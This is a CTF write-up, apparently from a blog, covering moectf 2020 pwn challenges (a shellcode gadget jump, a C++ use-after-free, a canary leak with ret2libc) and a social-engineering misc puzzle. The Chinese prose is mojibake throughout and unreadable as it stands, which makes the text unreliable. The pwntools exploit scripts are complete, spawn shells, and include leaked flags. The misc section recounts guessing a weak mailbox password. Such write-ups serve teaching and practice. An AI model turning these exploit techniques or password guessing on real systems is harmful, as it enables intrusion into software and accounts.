<p><strong>ä½†æ˜¯æº¢å‡ºå¤§å°åªæœ‰0x10ä¸ªå­—èŠ‚ï¼Œç”šè‡³æ— æ³•æ”¾ä¸‹ä¸€æ®µå®Œæ•´çš„èƒ½ç”¨ä»¥getshellçš„shellcodeï¼Œç®—ä¸Šè¦†ç›–æ‰RBPçš„å…«ä¸ªå­—èŠ‚ï¼Œè¿”å›åœ°å€çš„å…«ä¸ªå­—èŠ‚åï¼Œæˆ‘ä»¬ä¸€æ— æ‰€æœ‰XD</strong></p>
<p>è¿˜æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„gadgetå§XD</p>
<p>æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°åœ¨IDAä¸­ç›´æ¥æœ‰ä¸€æ®µä»£ç æ ‡æ³¨ç€<code>_gadget</code>ï¼Œçœ‹å¾—å‡ºæ¥è¿™æ®µä»£ç å¾ˆæƒ³è¢«æˆ‘ä»¬åˆ©ç”¨wwwï¼ˆ</p>
<p><img src="https://i.loli.net/2020/08/09/FidYB2N85WspeDt.png" alt="image.png"></p>
<blockquote>
<p>æ³¨ï¼šæ‰¾å¯»å¯åˆ©ç”¨çš„gadgetä¹Ÿå¯ä»¥ç”¨å·¥å…·ROPgadgetï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary hard_shellcode --ropchain</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/08/09/zw9PxaDdpCf4h5B.png" alt="image.png" style="zoom: 50%;" />
</blockquote>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œå½“æˆ‘ä»¬è¾“å…¥å®Œ0x50ä¸ªå­—èŠ‚æ—¶ï¼Œç¨‹åºè¿è¡Œåˆ°è¿”å›åœ°å€è¿”å›åˆ°æŸä¸ªä»£ç æ®µåï¼ŒrspæŒ‡å‘è¿”å›åœ°å€çš„é«˜ä¸€ä¸ªå­—èŠ‚</p>
<p>è‹¥æ˜¯è¿”å›è‡³gadgetï¼š0x4000eaï¼š</p>
<p>æ‰§è¡Œpush rbpåï¼Œ<strong>rsp = åŸrsp - 8</strong></p>
<p>æ‰§è¡Œmov rbp, rsp; sub rsp, 8åï¼Œ <strong>rsp = åŸrsp-16</strong></p>
<p>æ‰§è¡Œjmp rspå<strong>ç¨‹åºä¼šå°è¯•æ‰§è¡Œrspä¸Šçš„ä»£ç ï¼Œå³åŸrsp-16ä½ç½®ä¸Šçš„ä»£ç </strong></p>
<p>è¿™ä¸ªä½ç½®ä¾¿æ˜¯æˆ‘ä»¬<strong>è¾“å…¥æ—¶æ‰€è¦†ç›–æ‰çš„RBPçš„ä½ç½®</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™ä¸ªä½ç½®ä¸Š<strong>ä¾¿æœ‰8ä¸ªå­—èŠ‚çš„ç©ºé—´å¯ä»¥å†™ä¸Šæˆ‘ä»¬çš„shellcode</strong></p>
<p>åŒæ—¶æˆ‘ä»¬æƒ³åˆ°ï¼Œ<strong>å‰é¢è¿˜æœ‰64ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå®Œå…¨å¯ä»¥è£…å¾—ä¸‹ä¸€æ®µgetshellçš„shellcode</strong></p>
<p>æˆ‘ä»¬åªéœ€è¦å…ˆåœ¨å‰é¢å†™ä¸Šgetshellï¼Œ<strong>å†åœ¨8ä¸ªå­—èŠ‚çš„ç©ºé—´ä¸­å†™å…¥ä¿®æ”¹rspçš„å€¼å¹¶å†æ¬¡è·³è½¬è‡³rspå³å¯getshellï¼ˆrspä¸æˆ‘ä»¬çš„è¾“å…¥çš„åç§»é‡æ˜¯å¯çŸ¥çš„ï¼‰</strong></p>
<p>æ•…å¾—expï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">sub_rsp = asm(<span class="string">'sub rsp, 64'</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">'jmp rsp'</span>)</span><br><span class="line"></span><br><span class="line">gadget_addr = p64(<span class="number">0x4000ea</span>)</span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">b'A'</span>*(<span class="number">64</span>-len(sc)) + sub_rsp + jmp_rsp + <span class="string">b'A'</span>*(<span class="number">8</span>-len(sub_rsp)-len(jmp_rsp)) + gadget_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'hard_shellcode'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10002)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å‘æœåŠ¡å™¨å‘é€payloadï¼ŒæˆåŠŸgetsgell</p>
<p><img src="https://i.loli.net/2020/08/09/QwGlAhc5fd9rItp.png" alt="image.png"></p>
<p>å¾—åˆ°flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ni_HA0_q1ang_a!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easycppï¼ˆå·²ä¸‹çº¿ï¼‰-Use-After-Free"><a href="#easycppï¼ˆå·²ä¸‹çº¿ï¼‰-Use-After-Free" class="headerlink" title="easycppï¼ˆå·²ä¸‹çº¿ï¼‰ - Use After Free"></a>easycppï¼ˆå·²ä¸‹çº¿ï¼‰ - Use After Free</h2><blockquote>
<p>æ³¨ï¼šæœ¬é¢˜å› ä¸ºä¸€äº›åŸå› åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ä¸‹çº¿äº†</p>
</blockquote>
<p> <a href="/download/minil/pwn/easycpp"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-easycpp</a><br> <a href="/download/minil/pwn/libc.so.6"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-libc.so.6</a> </p>
<p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p>
<p><img src="https://i.loli.net/2020/08/09/tpZQ1nE5oaGdsRX.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå’Œå‰é¢å‡ é¢˜ä¸åŒçš„æ˜¯è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ª32ä½çš„ç¨‹åº</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p>
<p>ç”¨åˆ°äº†ä¸€ä¸ªåä¸º<code>B</code>çš„ç±»ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªç±»éƒ½æœ‰äº›å•¥</p>
<p>IDAä¸­ç±»Bæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°<code>B()</code>å’Œä¸€ä¸ª<code>print()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/08/09/oIvaelmuFLr24JY.png" alt="image.png"></p>
<p>ç±»Bçš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2020/08/09/s1t4V8f7k9JvLQT.png" alt="image.png"></p>
<p>ç±»Bçš„æ„é€ å‡½æ•°é¦–å…ˆè°ƒç”¨äº†ç±»Açš„æ„é€ å‡½æ•°ï¼Œç„¶åå°†å˜é‡_vptr_Aè®¾ç½®ä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p>
<p>æˆ‘ä»¬ä¸éš¾çœ‹åˆ°åœ¨0x80489E4ä½ç½®ä¸Šæˆ‘ä»¬è¿˜éœ€è¦å†è·³è½¬ä¸€æ¬¡åˆ°0x80488F2çš„ä½ç½®ï¼Œè¿™ä¸ªä½ç½®ä¸Šæœ‰ä¸€ä¸ª<code>B::print()</code>å‡½æ•°ï¼Œæ•…å¯çŸ¥è¿™æ˜¯ä¸€ä¸ª<strong>äºŒçº§å‡½æ•°æŒ‡é’ˆ</strong></p>
<p><img src="https://i.loli.net/2020/08/09/k7gyPQfNmvLeJCn.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/09/7ILSlb95q12Dfny.png" alt="image.png"></p>
<p>æˆ‘ä»¬å†æ¥çœ‹çœ‹ç±»Açš„æ„é€ å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p>
<img src="https://i.loli.net/2020/08/09/thgBiFQcLl86mru.png" alt="image.png" style="zoom:50%;" />

<p>ç±»Açš„æ„é€ å‡½æ•°ä¹Ÿæ˜¯å°†å˜é‡<code>_vptr_A</code>è®¾ç½®ä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p>
<p>ä½äºoff_80489F0ä¸Šçš„å‡½æ•°ä¸º<code>A::print()</code></p>
<p><img src="https://i.loli.net/2020/08/09/5qF6acIEWUGOvZ7.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/09/NDidotkIqXPuHn7.png" alt="image.png"></p>
<p>æ¥ä¸‹æ¥æ˜¯mainå‡½æ•°çš„ç®€å•åˆ†æï¼š</p>
<p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p>
<p>v3ã€v4éƒ½æ˜¯ä¸€ä¸ªç±»å‹ä¸º<code>ç±» B</code>çš„æŒ‡é’ˆ</p>
<p>é¦–å…ˆ<code>setvbuf()</code>å‡½æ•°å°†ç¨‹åºè®¾ç½®ä¸ºæ— ç¼“å†²è¾“å…¥</p>
<p>ä¹‹ååˆ›å»ºäº†ä¸€ä¸ªç±»Bçš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°æŒ‡é’ˆv3å’Œv4</p>
<p>ä¹‹åå°†è¯¥å®ä¾‹å†…çš„å˜é‡<code>_vptr_A</code>çš„å€¼è®¾ä¸º0</p>
<p>ä¹‹åä½¿ç”¨deleteé‡Šæ”¾æ‰ä¹‹å‰åˆ†é…ç»™v3ã€v4çš„å†…å­˜</p>
<p>ä¹‹å<strong>ä»æ ‡å‡†è¾“å…¥æµè¯»å…¥1024ä¸ªå­—èŠ‚åˆ°buf</strong>ï¼ˆæˆ–è®¸æœ‰æ“ä½œç©ºé—´ï¼Ÿï¼‰</p>
<p>ä¹‹åè°ƒç”¨<code>strbuf()</code>å‡½æ•°é‡æ–°åˆ†é…ä¸€æ®µå†…å­˜ç©ºé—´å¹¶å°†bufçš„å€¼æ‹·è´ä¸€ä»½ï¼ˆå½“ç„¶æœ€åå¹¶æ²¡æœ‰æŒ‡é’ˆæ¥æ”¶è¿™ä¸€å—å†…å­˜ï¼Œé‚£ä¹ˆå®ƒä¼šæˆä¸ºé‡å†…å­˜å—ï¼Ÿï¼‰</p>
<p>æœ€å<strong>é‡æ–°è°ƒç”¨v4çš„å‡½æ•°æŒ‡é’ˆå˜é‡æ‰€æŒ‡å‘çš„å‡½æ•°</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™é‡Œå°±å¯ä»¥å‘ç°ä¸€ä¸ªæ¼æ´ï¼š</p>
<p>v3ã€v4æ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´è¢«é‡Šæ”¾åv3ã€v4å¹¶æ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLï¼Œåœ¨è¿è¡Œåˆ°strdup()å‡½æ•°æ—¶è‹¥æ˜¯æˆ‘ä»¬ç»™åˆ°bufçš„è¾“å…¥é•¿åº¦åœ¨ä¸€å®šèŒƒå›´å†…ï¼Œè¿™ä¸€å—å†…å­˜ç©ºé—´ä¼šè¢«å †ç®¡ç†å™¨é‡æ–°åˆ†é…ç»™strdup()å‡½æ•°ï¼Œè€Œä¹‹ååˆé€šè¿‡v4å†æ¬¡å¯¹è¿™ä¸€å—å†…å­˜ç©ºé—´è¿›è¡Œè°ƒç”¨ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨<strong>UAFï¼ˆUse After Freeï¼‰</strong>æ¼æ´</p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ª<code>backdoor()</code>å‡½æ•°ç›´æ¥è°ƒç”¨äº†<code>system(&quot;/bin/sh&quot;)</code>ï¼Œå¯ä»¥ç›´æ¥getshell</p>
<p><img src="https://i.loli.net/2020/08/09/dPJUXZ6M9kx8RnN.png" alt="image.png"></p>
<p>æ•…æˆ‘ä»¬åªéœ€è¦è¦†å†™æ‰å‡½æ•°æŒ‡é’ˆæ‰€æŒ‡çš„å‡½æ•°ä¸ºbackdoor()å‡½æ•°å³å¯getshell</p>
<p>æ„é€ äºŒçº§æŒ‡é’ˆçš„ç»“æ„åº”ä¸º</p>
<table>
<thead>
<tr>
<th>buf</th>
<th>buf+4</th>
</tr>
</thead>
<tbody><tr>
<td>å³è¾¹é‚£ä¸€å—çš„åœ°å€ -&gt;</td>
<td>æŒ‡å‘backdoorå‡½æ•°çš„åœ°å€</td>
</tr>
</tbody></table>
<p>bufçš„åœ°å€å¦‚ä¸‹ï¼š</p>
<img src="https://img-blog.csdnimg.cn/20200809084003820.png" alt="image.png" style="zoom:50%;" />

<p>æ•…å¾—expå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'easycpp'</span>)<span class="comment">#p = remote('sec.eqqie.cn', 10007)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80487BB</span></span><br><span class="line">buf = <span class="number">0x804A0C0</span></span><br><span class="line"></span><br><span class="line">payload = p32(buf + <span class="number">4</span>) + p32(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å‘æœåŠ¡å™¨å‘é€payloadï¼ŒæˆåŠŸgetsgell</p>
<img src="https://i.loli.net/2020/08/09/eWifdr1K3v8Vxka.png" alt="image.png" style="zoom: 33%;" />

<img src="https://i.loli.net/2020/08/09/6nQtRSwIdhX5peB.png" alt="image.png" style="zoom:50%;" />

<p>å¾—åˆ°flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ev3ryth1ng_c@n_be_cPP!&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/" target="_blank" rel="noopener">ctf-wikf:Use After Free</a></p>
</blockquote>
<h2 id="baby-canary-canary-partial-overwrite-ret2libc"><a href="#baby-canary-canary-partial-overwrite-ret2libc" class="headerlink" title="baby canary - canary + partial overwrite + ret2libc"></a>baby canary - canary + partial overwrite + ret2libc</h2><p> [ç‚¹å‡»ä¸‹è½½-baby_canary](/download/moectf2020/pwn/baby canary/baby_canaryâ€ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜â€) </p>
<p> [ç‚¹å‡»ä¸‹è½½-libc.so.6](/download/moectf2020/pwn/baby canary/libc.so.6â€ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜â€) </p>
<p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p>
<p><img src="https://i.loli.net/2020/08/29/wtnmcLYru4OTdgs.png" alt="image.png"></p>
<p>é™¤äº†åœ°å€éšæœºåŒ–ä»¥å¤–éƒ½å¼€äº†ï¼Œ<strong>è¿™ä¹Ÿæ˜¯å”¯ä¸€ä¸€é“éœ€è¦æˆ‘ä»¬ç»•è¿‡canaryä¿æŠ¤çš„é¢˜</strong></p>
<p>å½“ç„¶ï¼Œçœ‹åå­—æˆ‘ä»¬å°±çŸ¥é“è¿™é¢˜è‚¯å®šè¦è€ƒcanaryï¼ˆ</p>
<p>é¦–å…ˆæ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/08/29/lAEmSNwFPbVyfop.png" alt="image.png"></p>
<p>å”¯ä¸€çš„ä¸€ä¸ªå¯å¡‘çš„è¾“å‡ºç‚¹æ˜¯printfï¼Œæˆ‘ä»¬è€ƒè™‘æ„é€ é•¿åº¦ä¸º<code>0x4c-0xc+1</code>çš„padding<strong>è¦†å†™æ‰canaryçš„æœ€é«˜ä½å­—èŠ‚\x00ï¼Œè¿™æ ·ç¨‹åºåœ¨è°ƒç”¨printfå‡½æ•°æ—¶ä¾¿ä¼šè¾“å‡ºcanaryçš„å€¼</strong></p>
<p>ä¹Ÿå°±æ˜¯<strong>partial overwrite</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„ç¬¬ä¸€æ¡payloadå°±å‡ºæ¥äº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>ä¹‹åç¨‹åºåœ¨è¾“å‡ºå®Œæˆ‘ä»¬çš„è¾“å…¥ä¹‹åè¿˜ä¼šå†è¾“å‡ºä¸€äº›ä¸œè¥¿ï¼Œè€Œå…¶ä¸­çš„å‰ä¸‰ä¸ªå­—èŠ‚ä¾¿æ˜¯<strong>canaryçš„ä½ä¸‰ä½å­—èŠ‚</strong></p>
<p>æ•…æˆ‘ä»¬è€ƒè™‘ä½¿ç”¨ä»¥ä¸‹ä»£ç å¾—åˆ°canaryï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">'\x00'</span>+p.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°äº†canaryçš„å€¼ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å°½æƒ…åœ°æº¢å‡ºäº†</p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„systemå‡½æ•°æˆ–æ˜¯/bin/shå­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2020/08/29/ZN8SXe5KECDAnJI.png" alt="image.png"></p>
<p>é¢˜ç›®ç»™å‡ºäº†<code>libc.so.6</code>æ–‡ä»¶ï¼Œæ•…è€ƒè™‘<strong>ret2libc</strong>ï¼Œæ„é€ ropé“¾å…ˆå°†å‡½æ•°è¿”å›è‡³<code>puts</code>ï¼Œè¾“å‡ºputså‡½æ•°çš„çœŸå®åœ°å€ï¼ˆå‚¨å­˜åœ¨gotè¡¨ä¸­ï¼‰ï¼Œä¹‹åè®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œå†è®¡ç®—å‡ºlibcä¸­systemå‡½æ•°ä¸/bin/shå­—ç¬¦ä¸²çš„çœŸå®åœ°å€ï¼Œæœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p>
<p>æ•…æœ€ç»ˆæ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10003</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby_canary'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>+<span class="number">1</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">b'\x00'</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>) + p32(canary) + <span class="string">b'A'</span>*(<span class="number">0xc</span><span class="number">-4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(puts_plt)+ p32(e.sym[<span class="string">'main'</span>]) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">'flag!\n'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = libc_base + libc.search(<span class="string">b'/bin/sh'</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>) + p32(canary) + <span class="string">b'A'</span>*(<span class="number">0xc</span><span class="number">-4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œexpï¼ŒæˆåŠŸgetshell</p>
<p><img src="https://i.loli.net/2020/08/29/v7Kau1Bop9rckdU.png" alt="image.png"></p>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;W0w_Y0u_c@n_e5cap3_fr0m_c4nary!&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-Misc"><a href="#0x02-Misc" class="headerlink" title="0x02.Misc"></a>0x02.Misc</h1><h2 id="ç®€-å•-çš„ç¤¾å·¥é¢˜"><a href="#ç®€-å•-çš„ç¤¾å·¥é¢˜" class="headerlink" title="ç®€ å• çš„ç¤¾å·¥é¢˜"></a>ç®€ å• çš„ç¤¾å·¥é¢˜</h2><p>æç¤ºè´´å§ï¼Œæˆ‘ä»¬æ¥åˆ°<code>moectfå§</code>ï¼Œå‘ç°è¿™æ ·ä¸€ä¸ªå¸–å­</p>
<img src="https://i.loli.net/2020/08/09/vd5xKPI8GijfU1J.jpg" alt="_Z1G_175TDBK@1F05F@355Q.jpg" style="zoom: 33%;" />

<p>æ²¡æœ‰é¢å¤–çš„ä¿¡æ¯ï¼Œäºæ˜¯æˆ‘ä»¬æ¥åˆ°å‘å¸–äººçš„ä¸»é¡µé¢ï¼Œå‘ç°å‘å¸–äººåªå…³æ³¨äº†ä¸€ä¸ªäºº</p>
<img src="https://i.loli.net/2020/08/09/NbqLYV6teWK5ac4.jpg" alt="6NGB@MPTK@K3CHM3UK7IN_C.jpg" style="zoom:33%;" />

<p>æˆ‘ä»¬æ¥åˆ°è¿™ä¸ªäººçš„ä¸»é¡µé¢çœ‹çœ‹</p>
<img src="https://i.loli.net/2020/08/09/GncNxdL3VBOEqme.jpg" alt="4_ZSME_W6O4V@_X_OT2_I_K.jpg" style="zoom: 33%;" />

<p>æ²¡æœ‰æ”¶è·ï¼Œæˆ‘ä»¬åˆæŸ¥çœ‹ä»–æ‰€å…³æ³¨çš„è´´å§</p>
<img src="https://i.loli.net/2020/08/09/QCOLqFobD9VR6Pz.jpg" alt="8_89V_9@_634~83__YVG_8D.jpg" style="zoom:33%;" />

<p>ä»ä¸‹å¾€ä¸Šçœ‹æ˜¯ï¼š<code>923431ourmail.</code></p>
<p>æ¨æµ‹åº”è¯¥æ˜¯ä¸€ä¸ªé‚®ç®±ï¼Œä½†æ˜¯ç‚¹çš„åé¢çš„åŸŸåä¸æ¸…æ¥š</p>
<p>ç™¾åº¦ourmailå¾—åˆ°<code>ourmail.cn</code>ï¼Œäºæ˜¯æˆ‘ä»¬çŸ¥é“äº†ä¸€ä¸ªå«åšourmailçš„ä¸œè¥¿XD</p>
<p>åœ¨ourmailæœç´¢<a href="mailto:923431@ourmail.cn">923431@ourmail.cn</a>ï¼Œæœç„¶æœ‰</p>
<p><img src="https://i.loli.net/2020/08/09/vuzECAyDQGUibWx.png" alt="image.png"></p>
<p>æ²¡ç»™å¯†ç ï¼Œæ¨æµ‹æ˜¯å¼±å£ä»¤ï¼Œå°è¯•äº†å‡ ä¸ªå¼±å£ä»¤å¾—åˆ°åŠ ç¾¤å¯†ç <code>a123456</code></p>
<p>è¿›å…¥åå‘ç°è¿™æ ·ä¸€ä¸ªé‚®ä»¶ï¼š</p>
<p><img src="https://i.loli.net/2020/08/09/o6kIlzaSBTD8Vs2.png" alt="image.png"></p>
<p>å‘å¸–äººå«<code>/s</code>ï¼Œé‚®ä»¶å†…å®¹æ˜¯<code>address: 1O9JFcsUyqQ7T85WXmHH6nQ</code>ï¼Œè¿˜å›äº†ä¸ª<code>a3cj</code></p>
<p>/s/addresså¾ˆæ˜æ˜¾æ˜¯ç™¾åº¦ç½‘ç›˜é“¾æ¥çš„æ ¼å¼</p>
<p>è¾“å…¥<code>pan.baidu.com/s/1O9JFcsUyqQ7T85WXmHH6nQ</code>ï¼Œæœç„¶å¾—åˆ°äº†ä¸€ä¸ªåˆ†ææ–‡ä»¶çš„é“¾æ¥ </p>
<p><img src="https://i.loli.net/2020/08/09/M6dEt8lkYCz3XFm.png" alt="image.png"></p>
<p>æˆ‘ä»¬å°†<code>a3cj</code>ä½œä¸ºæå–ç è¾“å…¥ï¼ŒæˆåŠŸè·å¾—æ–‡ä»¶ï¼Œä¸‹è½½ï¼Œè§£å‹å¾—å¦‚ä¸‹æ–‡æœ¬ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3RmJTdCdzB3X1kwdV9jNG5fZjFuZF9tM19vdVQlMjElN0Q&#x3D;</span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒæ˜æ˜¾çš„base64ç‰¹å¾ï¼Œè§£å¯†ï¼Œå¾—åˆ°flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;w0w_Y0u_c4n_f1nd_m3_ouT!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ä¸-ä¼š-å§-ï¼Ÿ-å°±-è¿™-Â¿"><a href="#ä¸-ä¼š-å§-ï¼Ÿ-å°±-è¿™-Â¿" class="headerlink" title="ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿"></a>ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿</h2><p>è€é˜´é˜³äººle</p>
<p>å›¾ç‰‡æ”¹åç¼€zipè§£å‹å¾—æ–‡æœ¬å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ 